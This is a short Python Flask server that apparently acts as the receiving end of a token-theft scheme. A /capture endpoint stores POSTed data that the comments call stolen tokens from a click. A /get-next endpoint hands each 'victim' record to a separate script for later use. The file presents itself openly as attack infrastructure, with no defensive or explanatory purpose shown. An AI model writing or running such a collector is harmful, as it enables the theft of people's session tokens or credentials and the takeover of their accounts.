from flask import Flask, request, jsonify

app = Flask(__name__)
# This list stores the tokens like a queue
stolen_queue = []

@app.route('/capture', methods=['POST'])
def capture():
    data = request.get_json() # Stolen data from the click
    stolen_queue.append(data)
    return jsonify({"status": "received"}), 200

@app.route('/get-next', methods=['GET'])
def get_next():
    # This lets the Python script grab the next victim
    if stolen_queue:
        return jsonify(stolen_queue.pop(0)) # Gives the data and removes it from list
    return jsonify({"status": "empty"}), 404
